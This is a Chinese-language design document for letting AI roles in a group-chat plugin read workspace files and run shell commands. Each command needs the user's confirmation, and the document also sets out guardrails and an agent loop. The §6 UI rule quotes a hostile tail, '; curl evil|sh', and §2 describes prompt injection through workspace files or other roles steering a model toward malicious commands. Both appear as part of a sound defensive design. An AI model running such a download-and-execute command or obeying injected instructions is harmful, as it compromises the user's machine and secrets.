# dsh-group-chat 工具执行设计（TOOLS）

> **v1.1**：经独立架构评审修订（B+ → A- 路径）。修复 3 个 Blocker：B1 空输出死循环绕过成本兜底、B2 降级触发与 dsh-llm 真实错误面错位、B3 确认等待缺唤醒机制；补全 dsh-llm 回注契约与流收集规则；采纳 3 项加固（路径分隔符、确认卡片全文、stdout 采集上限）。
> **v1.0**：经逐项 grill-me 确认的 8 项决策。前置：`PERSISTENCE.md` v2.1（消息/存储结构在其上增量扩展）。目标：让工作区从「只读展示台」升级为「工作台」，兑现「讨论需求和代码方案 **并运行测试**」的完整闭环。

## 0. 决策总览

grill-me 确认项：

| # | 决策点 | 结论 |
|---|---|---|
| 1 | 工具集 | `read_file` + `list_dir` + `run_command` 三件套（写文件由 bash 覆盖） |
| 2 | 安全确认 | 只读工具随工作区自动可用；`run_command` 群组开关（默认关）+ 逐条确认 |
| 3 | 沙箱约束 | 只读 realpath 硬约束工作区前缀；`run_command` 仅锚定 cwd，命令内容不过滤 |
| 4 | 护栏 | 120s 超时 / 100KB 读 / 8k 输出 / 32k 累计；**正常调用次数不设上限** |
| 5 | 并发模型 | 串行 round-robin：一个角色完整走完「生成⇄工具⇄发言」才轮到下一个 |
| 6 | 模型降级 | 运行时探测：不支持 tools 的错误 → 去 `tools` 重试一次 |
| 7 | 呈现/持久化 | 消息内嵌 `toolCalls` 块；折叠行 UI（对标思考折叠）；transcript 紧凑摘要注入 |
| 8 | 确认等待 | 无限等待；允许 / 拒绝（角色继续纯文本）/ 停止（整场终止）三出口 |

评审修订项（v1.1）：

| # | 决策点 | 结论 |
|---|---|---|
| 9 | 成本兜底（B1） | 每次调用计入地板成本 `max(output, 100)` 字符进 32k 预算；**连续 6 次空输出或完全相同调用**（同 tool + 同 args）即强制收尾——只拦死循环模式，不构成正常使用的次数上限 |
| 10 | 降级触发（B2） | 「不支持 tools」以 `finish {kind:'error', failure:{message, code}}` 到达（非 throw、无稳定错误码）；判定 = `kind==='error'` 且 `failure.message` 匹配 `/tool/i`（或 code ∈ {INVALID_REQUEST, PI_AI_ERROR} + 文本含 tool）→ 去 tools 重试一次 |
| 11 | 确认等待唤醒（B3） | 等待器注册双路径唤醒句柄（stop action + 插件 dispose）；stop 时 kill 正在执行的子进程；`confirmCommand` **同步三查**（`run.running` + `pendingConfirm` 非空 + `toolCallId` 匹配）全过才置空放行 |
| 12 | 回注契约 | tool-result 挂**独立 user-role 消息**（一次调用一条，`source {kind:'tool', callId}`）；assistant 消息（含 tool-call 块，带 `source {kind:'model', provider, model}`）**必须在其前** |
| 13 | 收尾路径 | 32k 累计或死循环触发收尾时，**工具历史折叠为纯文本摘要**重新发起收尾请求（不带 tools、不带 tool-call/tool-result 块）——规避无 tools 参数携带工具历史被 Anthropic 类协议 400 |

## 1. 工具集定义（传给模型的 ToolSchema）

```js
// read_file — 读工作区内一个文本文件
{ name: 'read_file', description: '读取群组工作区目录内的一个文本文件内容（≤100KB，超出截断）',
  parameters: { type: 'object', properties: { path: { type: 'string', description: '相对工作区根的路径' } }, required: ['path'] } }

// list_dir — 列工作区内目录条目
{ name: 'list_dir', description: '列出群组工作区目录内一个子目录的条目（名称/类型/大小）',
  parameters: { type: 'object', properties: { path: { type: 'string', description: '相对工作区根的路径，默认 "."' } } } }

// run_command — 工作区内执行 shell 命令（需群组开关 + 用户逐条确认）
{ name: 'run_command', description: '在群组工作区目录内执行 shell 命令（如运行测试、git 操作；需要用户逐条确认，超时 120 秒）',
  parameters: { type: 'object', properties: { command: { type: 'string' } }, required: ['command'] } }
```

工具可用性：`read_file`/`list_dir` 在群组设置了 `workspaceDir` 后即可用；`run_command` 还需群组 `allowCommands` 开关打开。工具列表随可用性动态变化（工作区未设置时不传 `tools` 字段）。

## 2. 沙箱与安全模型

**两种风险，两种对策：**

| 风险 | 对策 |
|---|---|
| 只读越界（读工作区外文件） | 技术硬边界：`realpath` 解析后必须满足 `target === wsReal || target.startsWith(wsReal + path.sep)`（**带分隔符比较**，防 `/ws/foo` 放行 `/ws/foobar`）；`../` 逃逸、软链逃逸、绝对路径越界一律拒绝并返回错误说明；`workspaceDir` 未设置时两工具返回「群组未设置工作区目录」 |
| 命令执行（任意 shell） | 人工确认：cwd 固定为 `workspaceDir`（`spawn('bash', ['-c', command], { cwd })`），命令内容**不过滤**——黑名单是无效防御；主防线是逐条确认 + 群组开关默认关 |

命令执行细节：

- stdout/stderr 合并捕获；**采集上限 1MB**（超出停止缓冲、仅计数，标注「输出采集超限已丢弃」，8k 截断只作用于回注文本）
- 超时 120s kill 并标注「执行超时」；退出码与输出一并回注
- `run.stopping` 为真时：等待中的命令作废、**正在执行的子进程 kill**（不等待自然结束）

已知并接受的风险（文档标注）：bash 继承宿主进程全部环境变量（含 DSH 进程自身的密钥），本地单用户 + 逐条确认下与 DSH 自身 bash 工具同级；提示注入面（工作区文件内容/其他角色话术操纵弱模型跑恶意命令）由确认闸门承接——**前提是确认 UI 完整显示命令全文**（§6 硬性约束）。`workspaceDir` 可设 `~` 或 `/`（设置处零校验），此时只读工具的可达范围等同全盘——UI 对极端取值给警示文案。

## 3. Agent loop（`speak()` 重构）

角色的一次发言从「一次生成」变为内部循环（runLoop 串行结构**不变**，只有 `speak` 内部变）。

### 3.1 流收集规则（对齐 dsh-llm BlockAssembler 语义）

`llm.stream` 的 chunk 处理：

- `text-delta` / `reasoning-delta` → `run.partial` / `run.partialReasoning`（现有行为）
- `tool-call-delta {index, id, name?, argumentsDelta}` → 按 index 累积拼装；**delta-only 协议（无 block-end）**由此拼装完成，`id` 缺失合成 `call-<index>`，`name` 缺失为 `''`
- `block-end {index, block}` → 该 index 的完整 `ToolCallBlock {type:'tool-call', id, name, arguments}`；**同一 index 关闭后再来的 delta 忽略**（防协议误发）
- `arguments` 是原始 JSON 字符串：解析 `JSON.parse` 失败时保底 `{}`（容忍）

### 3.2 finish 判定顺序（对齐 dsh-agent-loop）

1. `finish.reason.kind === 'error' | 'aborted'` → 先走错误处理（§3.4）；**半成品 tool-call 整体丢弃**（被截断的 arguments 不可执行）
2. `finish.reason.kind === 'max-tokens'` → **丢弃全部 tool-call 块**（max-token 截断的工具调用不可安全执行，assembler 同款语义），以已有 text 收尾
3. 否则以**组装出的 tool-call 块数 > 0** 驱动循环（不单押 `finish.kind === 'tool-calls'`——协议不保证两者耦合，stop finish 却带 tool-call 块的边角以此兜住）；块数为 0 → 正常收尾返回

### 3.3 循环体与回注契约

```
speak(g, sess, role):
  tools = buildToolSchemas(g)          // read/list 恒有；run_command 视开关；工作区未设则不传 tools
  msgs = [ { role:'user', content:[text(transcriptBlock)], source:{kind:'user'} } ]
  toolCalls = []; budgetUsed = 0; recent = []
  loop:
    流式调用 llm.stream({ ...opts, tools, messages: msgs })
    按 §3.1/§3.2 收集 → text/reasoning/toolCallBlocks/errorFinish
    若 errorFinish → 走 §3.4 降级或上抛
    若 toolCallBlocks.length > 0:
      逐个执行（run_command 走确认闸门 §4）
      toolCalls.push({tool, args, status, output, durationMs})
      budgetUsed += max(output.length, 100)            // B1 地板成本
      recent.push(sig(tool,args,output))；连续 6 次空输出或完全相同 → 触发收尾（§3.5）
      回注 msgs：
        assistant 消息：content = [本轮 text 块?, ...toolCall 块]，source {kind:'model', provider, model}
        每个 tool 结果一条 user-role 消息：content = [ToolResultBlock{toolCallId, content:[text], isError}]，source {kind:'tool', callId}
        （assistant 在前、结果消息在后、一调用一条——dsh-agent-loop createToolResultMessage 惯例）
      若 budgetUsed ≥ 32k → 触发收尾（§3.5）
      continue
    否则: return { text, reasoning, toolCalls }
```

插件手搓消息对象（现状 `speak` 已如此），无需 import dsh-llm；`ToolCallId`/`MessageId` 为 TS 品牌类型，纯 JS 运行时无校验。

### 3.4 降级路径（B2）

「模型不支持 tools」**不会 throw**：`LlmRuntime.stream` 把适配器/供应商错误规范化为终止 finish chunk `{kind:'error', failure:{message, code}}`。判定与重试：

- 收到 error finish 时**保留 `failure` 全文**（不得像现有 `streamOnce` 那样折叠成 `'模型输出异常终止'` 丢弃）
- 若 `failure.message` 匹配 `/tool/i`（或 code ∈ {INVALID_REQUEST, PI_AI_ERROR} 且文本含 tool）**且尚未降级过** → 删除 `tools` 后重试一次；降级后的后续轮次不再带 tools
- 其余错误照常上抛（发言失败 → runLoop 现有错误路径）
- 与现有 `UNSUPPORTED_REASONING_EFFORT` 重试正交，各自独立标志位，最多各重试一次

### 3.5 强制收尾（32k / 死循环）

触发条件：`budgetUsed ≥ 32k`，或连续 6 次调用满足「输出为空或 (tool+args+output) 与最近完全相同」。

收尾方式：**把 msgs 中的工具历史（assistant tool-call 消息 + tool-result 消息）折叠为一条 user-role 纯文本摘要**（`[工具] run_command npm test → 失败（…）` 逐条列出），注入提示「已达工具结果累计上限，请基于以上执行记录总结发言」，**不带 tools、不带任何 tool-call/tool-result 块**发起最终一次调用，返回收尾。——折叠而非裸保留的原因：pi-ai 投影不剥离历史中的工具块，无 tools 参数却携带 tool_use/tool_result 历史的请求可能被 Anthropic 类协议直接 400。

**停止响应**：每个工具执行前、确认等待唤醒后、每轮流式入口检查 `run.stopping`，为真则作废收尾（不执行剩余工具，返回已有内容）。

## 4. 确认流程（状态机，B3）

```
run.pendingConfirm: { toolCallId, tool: 'run_command', args } | null
run.confirmSignal:  { resolve, reject } | null      // 等待器的唤醒句柄
run.childProc:       ChildProcess | null            // 正在执行的命令
```

- `run_command` 执行前置入 `pendingConfirm` + 注册 `confirmSignal`，`touch()` 经 SSE 推送（120ms 节流，现有通道）
- 新 action：`confirmCommand { toolCallId, allow }`（走现有 `/api/group-chat/action`，带回环信任栏）
- **同步三查后置空**：处理函数在单线程同步段完成 `run.running && run.pendingConfirm !== null && run.pendingConfirm.toolCallId === 入参` 校验，全过才 `pendingConfirm = null` 并 resolve 等待器，随后异步执行命令——第二次并发确认/stale 确认/伪造 id 因已置空或 id 不符被拒
- 三出口：
  - **允许** → 执行（子进程句柄存 `run.childProc`）→ `pendingConfirm` 已空 → 输出回注 → 角色继续
  - **拒绝** → 等待器以「用户拒绝了这次命令执行」resolve → 角色继续纯文本收尾
  - **停止**（现有按钮）→ `run.stopping = true`；若 `pendingConfirm` 非空 → 唤醒等待者作废该命令；若 `childProc` 在跑 → **kill 子进程**；整场终止
- **无限等待，无超时、无 TTL**（命令没跑就没有副作用；防挂机超时只会静默毁掉讨论——评审明确反对加 TTL）
- **dispose 路径**（插件卸载/热重载）：现有 dispose 效应须先唤醒 `confirmSignal`、kill `childProc`，再走「最终 flush → 释放锁 → 置空 store」——消除 runLoop promise 永久悬挂泄漏
- SSE 断连与确认等待无耦合：`pendingConfirm` 在 host 内存态、快照驱动，客户端重连即恢复

## 5. 护栏常量（文件顶部集中）

```js
const RUN_CMD_TIMEOUT_MS = 120e3         // run_command 超时
const READ_FILE_MAX_BYTES = 100 * 1024    // read_file 单文件上限（超出截断）
const CMD_OUTPUT_MAX_CHARS = 8e3          // 单条命令输出回注截断
const CMD_CAPTURE_MAX_BYTES = 1 << 20     // 命令输出采集内存上限（1MB，超出弃置仅计数）
const TOOL_RESULTS_TOTAL_MAX = 32e3       // 单条发言工具结果累计预算（含地板成本）
const TOOL_FLOOR_COST_CHARS = 100         // 每次调用地板成本（B1：防空输出零累积）
const TOOL_REPEAT_LIMIT = 6               // 连续空输出/相同调用次数 → 收尾（B1）
const TRANSCRIPT_TOOL_SUMMARY = 200       // transcript 中工具输出摘要截断
// 正常调用的次数上限：不设（明确决策；死循环模式由 TOOL_REPEAT_LIMIT 兜）
```

## 6. 消息 / UI / 持久化增量

**消息对象**（`toolCalls` 可选字段，无则省略——v2.1 原则）：

```json
{
  "id": "msg-N", "speaker": "role-1", "text": "最终发言", "ts": 1, "seq": 1,
  "reasoning": "...",
  "toolCalls": [
    { "tool": "run_command", "args": { "command": "npm test" },
      "status": "ok", "output": "3 passing, 2 failing...", "durationMs": 2300 }
  ]
}
```

`status: 'ok' | 'error' | 'denied'`（denied = 用户拒绝）。

**UI**（client.js）：
- 消息卡内工具**折叠行**：复用思考折叠行（DisclosureRow）模式——摘要行「图标 read_file src/index.mjs ✓」/「图标 run_command npm test ✓ 2.3s」，展开看输出全文；图标一律宿主 `Icon*Outline` 原语（禁 Unicode 图形符，DESIGN.md 既有红线）
- **pending 态**：工具行显示「等待确认」+ 消息流内嵌「允许 / 拒绝」按钮（P.Button primary / outline）
- **确认卡片硬性约束：完整显示命令全文**——多行 pre-wrap 块，禁单行截断/省略号（防「前 200 字符无害 + 尾部 `; curl evil|sh`」借确认疲劳过关）
- **群组开关**：右栏「工作区目录」行旁加「允许执行命令」P.Switch（danger 语义标注）；`workspaceDir` 为 `~`/`/` 时设置处警示文案
- 流式中工具执行进度经现有 SSE 快照驱动（`run.pendingConfirm` + 消息 `toolCalls`）

**持久化**：`messageJson` 加 `toolCalls`（无则省略）；hydrate 兼容读取；session 文件 schema 仍为 1（可选字段增量，向后兼容，零迁移）。

**transcript 注入格式**（其他角色看到的群聊记录）：

```
【工程师】我认为问题出在工具函数…
  [工具] run_command: npm test → 失败（输出前 200 字符…）
```

单行紧凑摘要：`[工具] <tool> <args 简写> → <status>（输出截断至 TRANSCRIPT_TOOL_SUMMARY）`——保证下一个角色知道测试挂了、命令被拒了。

## 7. API / SSE 增量

| 增量 | 形态 |
|---|---|
| mutate op `setAllowCommands` | `{ groupId, allowed }` → 更新群组开关 |
| action kind `confirmCommand` | `{ toolCallId, allow }` → 三查同步置空后放行/拒绝 |
| snapshot 扩展 | `groups[].allowCommands`、`messages[].toolCalls`、`run.pendingConfirm` |

## 8. 群组 `allowCommands` 落盘

`ledger.json` 的 `groups[i]` 加可选字段 `allowCommands: boolean`（无则 `false`）。与群组名同级——群组**属性**归 ledger，不破坏「角色/会话明细不入 ledger」的 v2.1 原则；旧数据无字段即关，零迁移。

## 9. 验证清单（实现完成的判定标准）

- [ ] 全链路：角色 `list_dir` → `read_file` → `run_command`（确认后执行）→ 输出回注 → 最终发言的 `toolCalls` 完整记录
- [ ] 回注契约：assistant 消息在前、每工具一条 user-role 结果消息（stub llm 断言收到的 messages 结构）
- [ ] 沙箱：`../` 逃逸、绝对路径越界、软链逃逸、**分隔符陷阱**（workspaceDir=/tmp/foo 时 /tmp/foobar 拒绝）均被拒；未设工作区时只读工具报「未设置工作区」
- [ ] 确认流：允许 → 执行；拒绝 → 角色收到拒绝说明并继续发言；停止 → 命令作废、**执行中子进程被 kill**
- [ ] 三查闸门：stale toolCallId / 停止后的迟到确认 / 并发双确认均被拒
- [ ] 降级（B2）：stub llm 发 `finish{kind:'error', failure:{message:'tools not supported'}}` → 去 tools 重试一次成功
- [ ] 成本兜底（B1）：stub llm 死循环发空输出工具调用 → 地板成本累进 + 连续 6 次后强制收尾；有输出的正常长链路不受影响
- [ ] 收尾（13）：32k 触发后最终请求**不含 tool-call/tool-result 块**（stub 断言）
- [ ] 流收集：delta-only 累积、max-tokens 丢弃工具块、error 中断丢弃半成品
- [ ] 护栏：>100KB 文件截断；8k 回注截断；**>1MB stdout 采集弃置标注**；120s 超时 kill 并标注
- [ ] 持久化：`toolCalls` 落盘、重启恢复；transcript 摘要注入下一角色上下文
- [ ] 开关：`allowCommands` 默认关（tools 中无 run_command）；开启后可用；右栏开关生效
- [ ] 串行：角色 A 的工具操作完成后角色 B 才开始（runLoop 顺序不变）
- [ ] dispose：确认等待中执行插件 dispose → 等待者被唤醒、子进程被 kill、无悬挂 promise、锁正常释放
- [ ] `DSH_GROUP_CHAT_STORE` 临时目录 + stub llm（含 tool-call chunk 发射器）的 Host 半冒烟测试通过

## 10. Over-engineering 红线（明确不做）

命令内容黑名单/白名单过滤（无效防御）；「总是允许」快捷项（v1 保持安全模型纯粹）；**正常调用的次数上限**（明确决策不拦，死循环由 TOOL_REPEAT_LIMIT + 地板成本兜）；pendingConfirm TTL/超时（无限等待是明确决策，TTL 会静默毁讨论）；并行工具执行；跨群组工具会话共享；独立沙箱容器（docker/nsjail）；为收集 tool-call 引入对 `@deepseek-ai/dsh-llm` 的直接依赖或复刻完整 BlockAssembler（按 index 累积 delta 的 ~30 行手写足够）；bash 环境变量最小化（会破坏正常命令执行——PATH/HOME 是跑测试必需品，逐条确认已是主防线）。

## 11. 实现锚点（代码映射）

| 位置 | 改动 |
|---|---|
| `index.mjs` 顶部 | 护栏常量 + 工具 schema 定义 |
| `index.mjs` `speak()` | 重构为 agent loop（§3，含流收集/finish 判定/降级/收尾）；`buildToolSchemas` / `executeTool` / `resolveInWorkspace`（realpath 带分隔符硬校验） |
| `index.mjs` `run` 状态机 | `pendingConfirm` + `confirmSignal` + `childProc`；`confirmCommand` action 三查；stop / dispose 双路径唤醒与 kill |
| `index.mjs` `mutate` | `setAllowCommands` op；`appendMessage` 落 `toolCalls` |
| `index.mjs` `transcriptBlock` | 工具调用单行摘要注入 |
| `index.mjs` `messageJson`/`ledgerDocument`/`hydrate` | `toolCalls` / `allowCommands` 可选字段扩展 |
| `client.js` | 工具折叠行 + pending 确认卡片（命令全文）+ 右栏开关 + snapshot 适配 |
| `README.md` / `PRODUCT.md` | 功能与约束条目更新（含撤销「不注册模型可见工具」约束） |

实现需对齐的 dsh-llm 契约（评审已核实）：`ToolCallBlock {type:'tool-call', id, name, arguments:rawJsonString}`；`ToolResultBlock {toolCallId, content:[TextBlock], isError}` 挂 user-role 消息（`source {kind:'tool', callId}`）；assistant 消息带 `source {kind:'model', provider, model}`；错误经 `finish {kind:'error', failure:{message, code}}` 到达。
